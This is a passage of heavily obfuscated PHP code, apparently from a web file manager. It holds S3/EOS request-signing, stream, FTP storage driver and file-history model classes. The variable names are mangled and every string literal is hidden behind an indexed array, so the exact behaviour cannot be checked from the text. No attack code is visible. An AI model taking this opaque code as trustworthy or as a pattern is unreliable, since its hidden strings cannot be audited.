"\74\x45\x54\141\147\76{$ÕúîÃº‘[$Æ–·íâò[1330]]}\x3c\x2f\x45\x54\141\x67\x3e\xa" . $Æ–·íâò[1374]; } $ä§éïÚ« .= $Æ–·íâò[1375]; $„Æ”Ä = array(); $Œüü›¾ = explode($Æ–·íâò[177], $this->getHost()); $‚­ö„Ì = array($Æ–·íâò[1369] => $Œüü›¾[1], $Æ–·íâò[211] => $Æ–·íâò[119], $Æ–·íâò[1284] => strlen($ä§éïÚ«)); $©éÛ…ÀÅ = $Æ–·íâò[224]; $•áÈøË = $Æ–·íâò[8] . $this->pathEncode($“çû–ê”) . $İ€üÏß[$Æ–·íâò[168]]; $ÛÂûâáã = $this->client->__getSignatureV4($„Æ”Ä, $‚­ö„Ì, $©éÛ…ÀÅ, $•áÈøË, $ä§éïÚ«); return array($Æ–·íâò[232] => $ÛÂûâáã[$Æ–·íâò[232]], $Æ–·íâò[222] => $ÛÂûâáã[$Æ–·íâò[1371]], $Æ–·íâò[234] => $—™¥ £¬, $Æ–·íâò[1368] => $ÛÂûâáã[$Æ–·íâò[1368]]); } public function link($”ıÚí¡Ä, $ı¡¯Î®ç = array()) { return parent::link($”ıÚí¡Ä, $ı¡¯Î®ç); } public function fileOut($ÍË“öµ¢, $ß§ÉÁÑò = false, $ø—ú™õ = false, $‡éŠØ¿‰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ù×¯Ø…][1376])) { return parent::fileOutServer($ÍË“öµ¢, $ß§ÉÁÑò, $ø—ú™õ, $‡éŠØ¿‰); } parent::fileOut($ÍË“öµ¢, $ß§ÉÁÑò, $ø—ú™õ, $‡éŠØ¿‰); } public function fileOutImage($¼±Å£¹», $´Šââ˜õ = 250) { if (strstr($this->endpoint, $_SERVER[Ù×¯Ø…][1376])) { return parent::fileOutImageServer($¼±Å£¹», $´Šââ˜õ); } parent::fileOutImage($¼±Å£¹», $´Šââ˜õ); } public function fileOutLink($óûÆûŒ) { $İéÊÑóÉ =& $_SERVER[Ù×¯Ø…]; if (substr($óûÆûŒ, 0, 7) == $İéÊÑóÉ[1251]) { $óûÆûŒ = $İéÊÑóÉ[1252] . substr($óûÆûŒ, 7); } header($İéÊÑóÉ[159] . $óûÆûŒ); die; } public function getHost() { $ıÉéıºˆ =& $_SERVER[Ù×¯Ø…]; $¼”õ¼÷Ş = str_rtrim(parent::getHost(), $ıÉéıºˆ[8] . $this->bucket); $¼”õ¼÷Ş = explode($ıÉéıºˆ[177], $¼”õ¼÷Ş); return $¼”õ¼÷Ş[0] . $ıÉéıºˆ[177] . $this->bucket . $ıÉéıºˆ[95] . $¼”õ¼÷Ş[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($±Ö´èä, $÷ëÏ“ë© = 0) { parent::__construct(); $this->source = $±Ö´èä; $this->sourceSize = $÷ëÏ“ë©; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($°’æÕ´ç = false) { return $this->sourceSize; } public function getContent($Îİİòà¼ = false) { return $this->fileSubstr($Îİİòà¼, 0, $this->sourceSize); } public function fileSubstr($²¯ãÍÃ† = false, $¶À»•±Ú = 0, $²ªØúù = 0) { if (!$²ªØúù) { $²ªØúù = $this->sourceSize; } $–Éœ±ù = $this->sourceSize - $¶À»•±Ú; if ($²ªØúù >= $–Éœ±ù) { $²ªØúù = $–Éœ±ù; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¶À»•±Ú, $²ªØúù); } if ($this->sourceType == self::TYPE_FILE) { if ($²ªØúù <= 0) { return $_SERVER[Ù×¯Ø…][33]; } $Æ‹˜² = ftell($this->source); fseek_64($this->source, $Æ‹˜² + $¶À»•±Ú); $ÀÜ¾éÔ = @fread($this->source, $²ªØúù); fseek_64($this->source, $Æ‹˜²); return $ÀÜ¾éÔ; } } public function hashMd5($¶—ÂŞ¥ü = false) { return md5($this->getContent()); } public static function hash($ëøº¡¬É, $£­…ƒä¢ = 0) { $‡ç—¢ß¼ = new PathDriverStream($ëøº¡¬É, $£­…ƒä¢); return $‡ç—¢ß¼->hashSimple($ëøº¡¬É); } public static function md5($†§øØ, $ŸáÌÍ· = 0) { $ÒØ¢ÕŞ¿ = new PathDriverStream($†§øØ, $ŸáÌÍ·); return $ÒØ¢ÕŞ¿->hashMd5($†§øØ); } } goto F¿Ø¸¿À‰¥; Dç¸á·´Ñê: class PathDriverEDS extends PathDriverMinIO { public function __construct($—±è’”) { parent::__construct($—±è’”); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($» ì¤§‡) { parent::__construct($» ì¤§‡); $this->signatureVersion($_SERVER[Ù×¯Ø…][212]); } public function uploadFormData($‡˜İˆø, $²åˆû†¤ = 3600) { $œöÛıÅä =& $_SERVER[Ù×¯Ø…]; $òƒı™èË = $œöÛıÅä[192]; $çæğ‰ÜŒ = $œöÛıÅä[1272]; $«¹ßÉíÃ = $œöÛıÅä[59]; $ùÛĞµÈª = gmdate($œöÛıÅä[1273]); $´¦âÔê = gmdate($œöÛıÅä[750]); $¯Ãø·Ú– = $œöÛıÅä[1274]; $ñ–›ÈØ = $²åˆû†¤ . $œöÛıÅä[33]; $çÈ½¶•É = $œöÛıÅä[1236]; $”²üÙÊ = array($this->accessKey, $´¦âÔê, $this->region, $«¹ßÉíÃ, $¯Ãø·Ú–); $¾å’ÈèÖ = implode($œöÛıÅä[8], $”²üÙÊ); $¹Åó‚ = array($œöÛıÅä[1238] => gmdate($œöÛıÅä[1237], strtotime($œöÛıÅä[1275])), $œöÛıÅä[1239] => array(array($œöÛıÅä[1241] => $this->bucket), array($œöÛıÅä[1240] => $òƒı™èË), array($œöÛıÅä[1242], $œöÛıÅä[1243], $œöÛıÅä[33]), array($œöÛıÅä[1242], $œöÛıÅä[1276], $œöÛıÅä[33]), array($œöÛıÅä[1242], $œöÛıÅä[1277], $œöÛıÅä[33]), array($œöÛıÅä[1244] => $çÈ½¶•É), array($œöÛıÅä[1278] => $¾å’ÈèÖ), array($œöÛıÅä[1279] => $çæğ‰ÜŒ), array($œöÛıÅä[1280] => $ùÛĞµÈª), array($œöÛıÅä[1281] => $ñ–›ÈØ))); $Á’–³÷Ã = base64_encode(json_encode($¹Åó‚)); $ßğÖæ¿† = hash_hmac($œöÛıÅä[1282], $´¦âÔê, $œöÛıÅä[1283] . $this->secret, !0); $ç²Åˆó = hash_hmac($œöÛıÅä[1282], $this->region, $ßğÖæ¿†, !0); $Ñ÷¯ÈÍ = hash_hmac($œöÛıÅä[1282], $«¹ßÉíÃ, $ç²Åˆó, !0); $‰ ¥ÉŒ = hash_hmac($œöÛıÅä[1282], $¯Ãø·Ú–, $Ñ÷¯ÈÍ, !0); $—á¦½Ü = hash_hmac($œöÛıÅä[1282], $Á’–³÷Ã, $‰ ¥ÉŒ); $ÜÚĞ—û = array($œöÛıÅä[211] => $œöÛıÅä[33], $œöÛıÅä[1284] => $œöÛıÅä[33], $œöÛıÅä[1240] => $òƒı™èË, $œöÛıÅä[1244] => $çÈ½¶•É, $œöÛıÅä[1248] => $Á’–³÷Ã, $œöÛıÅä[1285] => $¾å’ÈèÖ, $œöÛıÅä[1286] => $çæğ‰ÜŒ, $œöÛıÅä[1287] => $ùÛĞµÈª, $œöÛıÅä[1288] => $ñ–›ÈØ, $œöÛıÅä[1289] => $—á¦½Ü, $œöÛıÅä[175] => $this->getHost()); return $ÜÚĞ—û; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Ùü˜óÌ) { parent::__construct(); if (count($Ùü˜óÌ) > 0) { $this->_init($Ùü˜óÌ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($æåë„™Ö) { $â¡£à«  =& $_SERVER[Ù×¯Ø…]; global $config; $this->appCharset = $config[$â¡£à« [1290]]; $this->systemCharset = $config[$â¡£à« [1291]]; if (isset($æåë„™Ö[$â¡£à« [1292]]) && $æåë„™Ö[$â¡£à« [1292]]) { $this->systemCharset = $æåë„™Ö[$â¡£à« [1292]]; } } public function iconvApp($äÕĞÀßÒ) { return $this->iconvTo($äÕĞÀßÒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($õ³§¼‚) { return $this->iconvTo($õ³§¼‚, $this->appCharset, $this->systemCharset); } public function getPathOuter($º«®ùâÖ) { $Õ¾Øğãğ =& $_SERVER[Ù×¯Ø…]; $Èù–Îì² = $this->iconvApp($this->pathBase); $º«®ùâÖ = $this->iconvApp($º«®ùâÖ); if (substr($Èù–Îì², 0, 2) == $Õ¾Øğãğ[1293]) { $Èù–Îì² = BASIC_PATH . substr($Èù–Îì², 2); } if (substr($º«®ùâÖ, 0, 2) == $Õ¾Øğãğ[1293]) { $º«®ùâÖ = BASIC_PATH . substr($º«®ùâÖ, 2); } $Èù–Îì² = KodIO::clear($Èù–Îì²); $º«®ùâÖ = KodIO::clear($º«®ùâÖ); $º«®ùâÖ = substr($º«®ùâÖ, strlen($Èù–Îì²)); if (empty($this->pathDriver)) { return $º«®ùâÖ; } return $this->pathDriver . $Õ¾Øğãğ[8] . ltrim($º«®ùâÖ, $Õ¾Øğãğ[8]); } private function _init($áØĞÑèÕ = array()) { $¾êÊË©é =& $_SERVER[Ù×¯Ø…]; if (!function_exists($¾êÊË©é[1294])) { throw new Exception(LNG($¾êÊË©é[1295])); } $this->config = $áØĞÑèÕ; $this->charsetReset($áØĞÑèÕ); foreach ($áØĞÑèÕ as $ö©…¬ÅÖ => $”ªë×«) { if (isset($this->{$ö©…¬ÅÖ})) { $this->{$ö©…¬ÅÖ} = $”ªë×«; } } return $this->_login($áØĞÑèÕ); } private function _login($ÙãŸ¶ÑÁ) { $àœ†ô× =& $_SERVER[Ù×¯Ø…]; static $æ˜€…Í = array(); $¡şÃ°äï = md5(json_encode($ÙãŸ¶ÑÁ)); if (isset($æ˜€…Í[$¡şÃ°äï])) { foreach ($æ˜€…Í[$¡şÃ°äï] as $Äæôäá¬ => $ÅôµèôÃ) { $this->{$Äæôäá¬} = $ÅôµèôÃ; } return !0; } $‰åñ»Û = parse_url(trim($this->server, $àœ†ô×[8])); $this->host = $‰åñ»Û[$àœ†ô×[175]]; $²ØË¾ì» = isset($‰åñ»Û[$àœ†ô×[174]]) && $‰åñ»Û[$àœ†ô×[174]] == $àœ†ô×[1296] ? !0 : !1; $this->scheme = $²ØË¾ì» ? $àœ†ô×[1297] : $àœ†ô×[1298]; $this->port = isset($‰åñ»Û[$àœ†ô×[176]]) ? $‰åñ»Û[$àœ†ô×[176]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $é±ö¯Ã´ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $âá¥ÃØ× = $this->pasv == $àœ†ô×[87] ? !0 : !1; @ftp_pasv($this->connect, $âá¥ÃØ×); $æ˜€…Í[$¡şÃ°äï] = array($àœ†ô×[1299] => $this->connect, $àœ†ô×[175] => $this->host, $àœ†ô×[174] => $this->scheme, $àœ†ô×[176] => $this->port); return $é±ö¯Ã´; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ÎÒñ¢İš, $ÛÓµ¸åù = '', $Ş…—·†± = REPEAT_RENAME) { if ($this->setContent($ÎÒñ¢İš, $ÛÓµ¸åù)) { return $this->getPathOuter($ÎÒñ¢İš); } return !1; } public function mkdir($º½ÛÕ¸Ç, $©© Ø¶ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $º½ÛÕ¸Ç = $this->iconvSystem($º½ÛÕ¸Ç); if ($this->_isFolder($º½ÛÕ¸Ç) || @ftp_mkdir($this->connect, $º½ÛÕ¸Ç)) { return $this->getPathOuter($º½ÛÕ¸Ç); } if (!$this->mkdir($this->pathFather($º½ÛÕ¸Ç))) { return !1; } if ($º½ÛÕ¸Ç = @ftp_mkdir($this->connect, $º½ÛÕ¸Ç)) { return $this->getPathOuter($º½ÛÕ¸Ç); } return !1; } public function copyFile($¡Œ•Ø„¥, $ŸÛî¾§) { if (!$this->_isconn()) { return !1; } $µ¼³”† = $this->pathThis($this->iconvSystem($¡Œ•Ø„¥)); $»–Ë—È¨ = $this->tempFile($µ¼³”†); $÷Îò“…¸ = $this->iconvApp($»–Ë—È¨); $this->download($¡Œ•Ø„¥, $÷Îò“…¸); $Ïüã€È” = $this->upload($ŸÛî¾§, $÷Îò“…¸); $this->tempFileRemve($»–Ë—È¨); return $Ïüã€È”; } public function moveFile($ã…ŸŒûá, $¹†ü¤‰) { if (!$this->_isconn()) { return !1; } $ã…ŸŒûá = $this->iconvSystem($ã…ŸŒûá); $¹†ü¤‰ = $this->iconvSystem($¹†ü¤‰); $¾«¹ã† = @ftp_rename($this->connect, $ã…ŸŒûá, $¹†ü¤‰); return $¾«¹ã† ? $this->getPathOuter($¹†ü¤‰) : !1; } public function delFile($ãƒ¨ˆ˜) { if (!$this->_isconn()) { return !1; } $ãƒ¨ˆ˜ = $this->iconvSystem($ãƒ¨ˆ˜); return @ftp_delete($this->connect, $ãƒ¨ˆ˜); } public function delFolder($ŠºøÙ¹) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $İÓèÁÂ = $¦„÷Îéƒ = array(); $this->fileList($ŠºøÙ¹, $İÓèÁÂ, $¦„÷Îéƒ, !0); $this->listItemCache = !0; foreach ($¦„÷Îéƒ as $³ò‹†¯) { $½á¤óÚ = $this->iconvSystem($³ò‹†¯[$_SERVER[Ù×¯Ø…][28]]); $ş—††£Ô = @ftp_delete($this->connect, $½á¤óÚ); if (!$ş—††£Ô) { return !1; } } foreach ($İÓèÁÂ as $½á¤óÚ) { $½á¤óÚ = $this->iconvSystem($½á¤óÚ); $ş—††£Ô = @ftp_rmdir($this->connect, $½á¤óÚ); if (!$ş—††£Ô) { return !1; } } $ŠºøÙ¹ = $this->iconvSystem($ŠºøÙ¹); return @ftp_rmdir($this->connect, $ŠºøÙ¹); } public function rename($ŞÍíù‡, $íæ¤îŠù) { $‰å¶ÓÊñ =& $_SERVER[Ù×¯Ø…]; if (!$this->_isconn()) { return !1; } $—Ê§¢º¢ = $this->fileNameAuto($this->pathFather($ŞÍíù‡), $íæ¤îŠù); $—Ê§¢º¢ = $this->iconvSystem($—Ê§¢º¢); $ŞÍíù‡ = $this->iconvSystem($ŞÍíù‡); $†®æÏœ = $this->pathFather($ŞÍíù‡); $¾Å‹È‚ = rtrim($†®æÏœ, $‰å¶ÓÊñ[8]) . $‰å¶ÓÊñ[8] . $—Ê§¢º¢; $Š²§£® = @ftp_rename($this->connect, $ŞÍíù‡, $¾Å‹È‚); $¾Å‹È‚ = $this->iconvApp($¾Å‹È‚); return $Š²§£® ? $this->getPathOuter($¾Å‹È‚) : !1; } private function folderInfo($ãòáÔ¸¼, $ã­¦¶‘ä = false) { $¡…éÎ»¾ =& $_SERVER[Ù×¯Ø…]; $çƒ¥Å„ë = array($¡…éÎ»¾[28] => $this->pathThis($ãòáÔ¸¼), $¡…éÎ»¾[76] => $this->getPathOuter($¡…éÎ»¾[8] . $ãòáÔ¸¼), $¡…éÎ»¾[29] => $¡…éÎ»¾[77]); if ($ã­¦¶‘ä) { return $çƒ¥Å„ë; } $çƒ¥Å„ë[$¡…éÎ»¾[194]] = $çƒ¥Å„ë[$¡…éÎ»¾[84]] = 0; $çƒ¥Å„ë[$¡…éÎ»¾[195]] = $çƒ¥Å„ë[$¡…éÎ»¾[196]] = !0; return $çƒ¥Å„ë; } private function fileInfo($ùğ™»¯, $Â÷·ùİÖ = false, $‘ÆôÔçú = array()) { $ö¸¹…Áˆ =& $_SERVER[Ù×¯Ø…]; $ §Ü– = array($ö¸¹…Áˆ[28] => $this->pathThis($ùğ™»¯), $ö¸¹…Áˆ[76] => $this->getPathOuter($ö¸¹…Áˆ[8] . $ùğ™»¯), $ö¸¹…Áˆ[29] => $ö¸¹…Áˆ[193], $ö¸¹…Áˆ[78] => isset($‘ÆôÔçú[$ö¸¹…Áˆ[78]]) ? $‘ÆôÔçú[$ö¸¹…Áˆ[78]] : 0, $ö¸¹…Áˆ[168] => $this->ext($ùğ™»¯)); if ($Â÷·ùİÖ) { return $ §Ü–; } $ §Ü–[$ö¸¹…Áˆ[194]] = $ §Ü–[$ö¸¹…Áˆ[84]] = 0; $ §Ü–[$ö¸¹…Áˆ[195]] = $ §Ü–[$ö¸¹…Áˆ[196]] = !0; $¬’„—ßû = $this->iconvSystem($ùğ™»¯); $ §Ü–[$ö¸¹…Áˆ[84]] = @ftp_mdtm($this->connect, $¬’„—ßû); if (empty($‘ÆôÔçú)) { $‘ÆôÔçú = $this->objectMeta($ùğ™»¯); if (!$‘ÆôÔçú) { return $ §Ü–; } } $ §Ü–[$ö¸¹…Áˆ[78]] = $‘ÆôÔçú[$ö¸¹…Áˆ[78]]; return $ §Ü–; } public function size($Õî™¦èß) { $…ÊÜÇ¯‡ = $this->objectMeta($Õî™¦èß); return $…ÊÜÇ¯‡ ? $…ÊÜÇ¯‡[$_SERVER[Ù×¯Ø…][78]] : 0; } public function info($“²ô‹Áª) { if ($this->isFile($“²ô‹Áª)) { return $this->fileInfo($“²ô‹Áª, 0); } else { if ($this->isFolder($“²ô‹Áª)) { return $this->folderInfo($“²ô‹Áª); } } return !1; } private function fileList($¬Ñ´ñ‰¶, &$¾™¾Æ, &$‰®½ÒÔ, $Ò§¬àë­ = false) { $üÛ£ş¤Œ =& $_SERVER[Ù×¯Ø…]; $¬Ñ´ñ‰¶ = $this->iconvSystem($¬Ñ´ñ‰¶); if (!$this->isFolder($¬Ñ´ñ‰¶)) { return !1; } @ftp_chdir($this->connect, $üÛ£ş¤Œ[8]); $¬Ñ´ñ‰¶ = rtrim($¬Ñ´ñ‰¶, $üÛ£ş¤Œ[8]) . $üÛ£ş¤Œ[8]; check_abort(); $¯‡¹ Ÿ = $this->listItemCache === !1 ? !1 : !0; $…Å‡­Ä¾ = @ftp_rawlist($this->connect, $¬Ñ´ñ‰¶); if (!$…Å‡­Ä¾) { $…Å‡­Ä¾ = array(); } $›”®Ù˜ = array($üÛ£ş¤Œ[95] => 1, $üÛ£ş¤Œ[1300] => 1); foreach ($…Å‡­Ä¾ as $«º££’·) { $¸å®ÈÑ = $this->_listItem($«º££’·); if ($¸å®ÈÑ[0] == $üÛ£ş¤Œ[758]) { continue; } $†…»æì÷ = $¸å®ÈÑ[8]; if (empty($†…»æì÷) && $†…»æì÷ !== $üÛ£ş¤Œ[191] || isset($›”®Ù˜[$†…»æì÷])) { continue; } $†…»æì÷ = $this->iconvApp($¬Ñ´ñ‰¶ . ltrim($†…»æì÷, $üÛ£ş¤Œ[8])); $û›´ïº‘ = array($üÛ£ş¤Œ[28] => $†…»æì÷, $üÛ£ş¤Œ[29] => $üÛ£ş¤Œ[193], $üÛ£ş¤Œ[78] => $¸å®ÈÑ[4]); if (substr($«º££’·, 0, 1) == $üÛ£ş¤Œ[1301]) { $û›´ïº‘[$üÛ£ş¤Œ[29]] = $üÛ£ş¤Œ[77]; $û›´ïº‘[$üÛ£ş¤Œ[78]] = 0; } $ìŠÖÏÖÙ = $û›´ïº‘[$üÛ£ş¤Œ[29]] == $üÛ£ş¤Œ[77] ? !0 : !1; if ($¯‡¹ Ÿ) { $this->cacheMethod($üÛ£ş¤Œ[199], $†…»æì÷, $ìŠÖÏÖÙ); $this->cacheMethod($üÛ£ş¤Œ[200], $†…»æì÷, $û›´ïº‘); } if ($ìŠÖÏÖÙ) { $¾™¾Æ[] = $†…»æì÷; if ($Ò§¬àë­) { $this->fileList($†…»æì÷, $¾™¾Æ, $‰®½ÒÔ, $Ò§¬àë­); } continue; } $‰®½ÒÔ[] = $û›´ïº‘; } if ($¯‡¹ Ÿ) { $this->cacheMethod($üÛ£ş¤Œ[199], $¬Ñ´ñ‰¶, !0); } } private function _listItem($ı†ˆƒûÁ) { if (empty($ı†ˆƒûÁ)) { return array(); } $Æ¥ ·ª = preg_split($_SERVER[Ù×¯Ø…][1302], $ı†ˆƒûÁ); if (count($Æ¥ ·ª) <= 9) { return $Æ¥ ·ª; } $Æ¥ ·ª[8] = trim(substr($ı†ˆƒûÁ, strpos($ı†ˆƒûÁ, $Æ¥ ·ª[7]) + strlen($Æ¥ ·ª[7]))); return array_splice($Æ¥ ·ª, 0, 9); } public function listPath($€ÇĞ‹êÙ, $í€©ùšÅ = false) { $·¥¸÷ =& $_SERVER[Ù×¯Ø…]; if (!$this->_isconn()) { return !1; } $İ™“îú = $»Ÿı×éß = array(); $this->fileList($€ÇĞ‹êÙ, $İ™“îú, $»Ÿı×éß); foreach ($İ™“îú as $ã¼ñÄ  => $²™íøÖ÷) { $İ™“îú[$ã¼ñÄ ] = $this->folderInfo($²™íøÖ÷, $í€©ùšÅ); } foreach ($»Ÿı×éß as $ã¼ñÄ  => $²™íøÖ÷) { $»Ÿı×éß[$ã¼ñÄ ] = $this->fileInfo($²™íøÖ÷[$·¥¸÷[28]], $í€©ùšÅ, $²™íøÖ÷); } return array($·¥¸÷[75] => $İ™“îú, $·¥¸÷[74] => $»Ÿı×éß); } public function has($˜ÒöÔÑÜ, $¤§Š‚Şé = false, $†ô¾ÙÔí = true) { $Üá¼ö©· =& $_SERVER[Ù×¯Ø…]; $à²æ¹Ô = $Ó×©Ò‚ = array(); $«ô•¼—Î = $¤§Š‚Şé ? !0 : !1; $this->fileList($˜ÒöÔÑÜ, $à²æ¹Ô, $Ó×©Ò‚, $«ô•¼—Î); if ($¤§Š‚Şé) { return array($Üá¼ö©·[203] => count($Ó×©Ò‚), $Üá¼ö©·[204] => count($à²æ¹Ô)); } if ($†ô¾ÙÔí) { if (count($Ó×©Ò‚)) { return !0; } } else { if (count($à²æ¹Ô)) { return !0; } } return !1; } public function listAll($Ï¦ÏÙ½İ) { $÷€¸Ùåè =& $_SERVER[Ù×¯Ø…]; if (!$this->_isconn()) { return !1; } $Ş†äİÖ = $ˆ¯ıéíŒ = array(); $this->fileList($Ï¦ÏÙ½İ, $Ş†äİÖ, $ˆ¯ıéíŒ, !0); $‡¤ÖùôÌ = array(); foreach ($ˆ¯ıéíŒ as $°Î¢¶ô“) { $‡¤ÖùôÌ[$°Î¢¶ô“[$÷€¸Ùåè[28]]] = $°Î¢¶ô“[$÷€¸Ùåè[78]]; } foreach ($Ş†äİÖ as $°Î¢¶ô“) { if (is_string($°Î¢¶ô“)) { $‡¤ÖùôÌ[$°Î¢¶ô“] = 0; } } return $this->listAllFiles($Ï¦ÏÙ½İ, array_keys($‡¤ÖùôÌ), $‡¤ÖùôÌ); } public function getContent($ù‰¥å½) { if (!$this->_isconn()) { return !1; } $ù‰¥å½ = $this->iconvSystem($ù‰¥å½); return $this->fileSubstr($ù‰¥å½); } public function setContent($ˆ¢ùŞÑ, $ÌŞÈ®ù = '') { if (!$this->_isconn()) { return !1; } $ˆÀÜ×ü = $this->pathThis($this->iconvSystem($ˆ¢ùŞÑ)); $èÕ„¨Š¸ = $this->tempFile($ˆÀÜ×ü); file_put_contents($èÕ„¨Š¸, $ÌŞÈ®ù); $ÛÑÚ£ = $this->upload($ˆ¢ùŞÑ, $this->iconvApp($èÕ„¨Š¸)); $this->tempFileRemve($èÕ„¨Š¸); return $ÛÑÚ£; } public function fileSubstr($§Ö½ñáÊ, $œ«èÇ˜È = 0, $¾ÈÌÍ˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($§Ö½ñáÊ, $œ«èÇ˜È, $¾ÈÌÍ˜); } private function ftpRequest($ô»¦éê, $äê”õÕ® = 0, $ê¼Æ··Ï = false) { $ô»¦éê = $this->iconvSystem($ô»¦éê); $ˆô¥¯ñº = $this->scheme . $this->host . $_SERVER[Ù×¯Ø…][4] . $this->port; $–¿¿éîŸ = curl_init(); curl_setopt($–¿¿éîŸ, CURLOPT_URL, $ˆô¥¯ñº . $this->pathEncode($ô»¦éê)); curl_setopt($–¿¿éîŸ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ê¼Æ··Ï) { $ˆéé‡Ûê = $äê”õÕ® + $ê¼Æ··Ï - 1; curl_setopt($–¿¿éîŸ, CURLOPT_RANGE, "{$äê”õÕ®}\55{$ˆéé‡Ûê}"); } curl_setopt($–¿¿éîŸ, CURLOPT_RETURNTRANSFER, 1); $óŞÊ¦–ü = curl_exec($–¿¿éîŸ); curl_close($–¿¿éîŸ); return $óŞÊ¦–ü; } public function upload($¹¦ïÈö, $Àá˜Æíû, $¾¿ù‚òœ = false, $ë»©é»Ò = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¹¦ïÈö))) { return !1; } $¹¦ïÈö = $this->iconvSystem($¹¦ïÈö); $Àá˜Æíû = $this->iconvSystem($Àá˜Æíû); $‰÷Šˆë = ftp_nb_put($this->connect, $¹¦ïÈö, $Àá˜Æíû, FTP_BINARY); while ($‰÷Šˆë == FTP_MOREDATA) { $‰÷Šˆë = ftp_nb_continue($this->connect); } if ($‰÷Šˆë != FTP_FINISHED) { return !1; } return $this->getPathOuter($¹¦ïÈö); } public function download($Šäğš‚, $†ó¢ÆÀ = '') { if (!$this->_isconn()) { return !1; } $ŞÇˆ = $this->pathFather($†ó¢ÆÀ); if (!IO::mkdir($ŞÇˆ)) { return !1; } $Šäğš‚ = $this->iconvSystem($Šäğš‚); $†ó¢ÆÀ = $this->iconvSystem($†ó¢ÆÀ); $´‚ÄõÜ½ = ftp_nb_get($this->connect, $†ó¢ÆÀ, $Šäğš‚, FTP_BINARY); while ($´‚ÄõÜ½ == FTP_MOREDATA) { $´‚ÄõÜ½ = ftp_nb_continue($this->connect); } if ($´‚ÄõÜ½ != FTP_FINISHED) { return !1; } return $this->iconvApp($†ó¢ÆÀ); } public function exist($ıöãŒ‰) { return $this->isFile($ıöãŒ‰) || $this->isFolder($ıöãŒ‰); } public function isFile($¬ Â“¶“) { return !$this->isFolder($¬ Â“¶“) && $this->objectMeta($¬ Â“¶“); } public function isFolder($÷Ï¨ÛÆ¸) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][199], $÷Ï¨ÛÆ¸); } protected function objectMeta($”¦­µ) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][200], $”¦­µ); } protected function _objectMeta($Ğ¶Ì™é¦) { $˜‡ä€Ø½ =& $_SERVER[Ù×¯Ø…]; if ($Ğ¶Ì™é¦ == $˜‡ä€Ø½[33] || $Ğ¶Ì™é¦ == $˜‡ä€Ø½[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ğ¶Ì™é¦ = $this->iconvSystem($Ğ¶Ì™é¦); $ƒ˜Šìš = array($˜‡ä€Ø½[28] => $this->iconvApp($Ğ¶Ì™é¦), $˜‡ä€Ø½[29] => $˜‡ä€Ø½[193], $˜‡ä€Ø½[78] => 0); @ftp_chdir($this->connect, $˜‡ä€Ø½[8]); $ù™”¹¼Ö = @ftp_size($this->connect, $Ğ¶Ì™é¦); if ($ù™”¹¼Ö != -1) { $ƒ˜Šìš[$˜‡ä€Ø½[78]] = $ù™”¹¼Ö; } else { $Ÿ£Ëí±« = @ftp_chdir($this->connect, $Ğ¶Ì™é¦); if (!$Ÿ£Ëí±«) { return !1; } $ƒ˜Šìš[$˜‡ä€Ø½[29]] = $˜‡ä€Ø½[77]; } return $ƒ˜Šìš; } protected function _isFolder($ê¹úâíÉ) { $©™Ë†ÑŠ =& $_SERVER[Ù×¯Ø…]; if ($ê¹úâíÉ == $©™Ë†ÑŠ[33] || $ê¹úâíÉ == $©™Ë†ÑŠ[8]) { return !0; } $äßÏ¸¤• = $this->_objectMeta($ê¹úâíÉ); return isset($äßÏ¸¤•[$©™Ë†ÑŠ[29]]) && $äßÏ¸¤•[$©™Ë†ÑŠ[29]] == $©™Ë†ÑŠ[77] ? !0 : !1; } } goto D˜…ê‹™•Õ; eíù®´Ö÷‡: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\143\x65\x5f\150\151\163\164\x6f\162\171"; public function historyCount($•ÇêÏáÑ) { $’³Éİ¥¾ =& $_SERVER[Ù×¯Ø…]; if (!$•ÇêÏáÑ) { return array(); } if (is_string($•ÇêÏáÑ) || is_int($•ÇêÏáÑ)) { $•ÇêÏáÑ = array($•ÇêÏáÑ); } $–ğ¸ş‡õ = array($’³Éİ¥¾[406], $’³Éİ¥¾[1780] => $’³Éİ¥¾[503]); $óœİ´—­ = array($’³Éİ¥¾[406] => array($’³Éİ¥¾[7], $•ÇêÏáÑ)); $ÎÜËãª‚ = $this->field($–ğ¸ş‡õ)->where($óœİ´—­)->group($’³Éİ¥¾[406])->select(); return array_to_keyvalue($ÎÜËãª‚, $’³Éİ¥¾[406], $’³Éİ¥¾[503]); } public function addHistory($ìÎ€“³À, $ò™ù÷¯… = '') { $¿š¯ÉğŠ =& $_SERVER[Ù×¯Ø…]; $¹ôì = array($¿š¯ÉğŠ[421] => $ìÎ€“³À[$¿š¯ÉğŠ[406]], $¿š¯ÉğŠ[1571] => isset($ìÎ€“³À[$¿š¯ÉğŠ[457]]) ? $ìÎ€“³À[$¿š¯ÉğŠ[457]] : $ìÎ€“³À[$¿š¯ÉğŠ[455]], $¿š¯ÉğŠ[471] => $ìÎ€“³À[$¿š¯ÉğŠ[470]], $¿š¯ÉğŠ[582] => $ìÎ€“³À[$¿š¯ÉğŠ[78]], $¿š¯ÉğŠ[1982] => $ò™ù÷¯…); $£¨àÒäå = 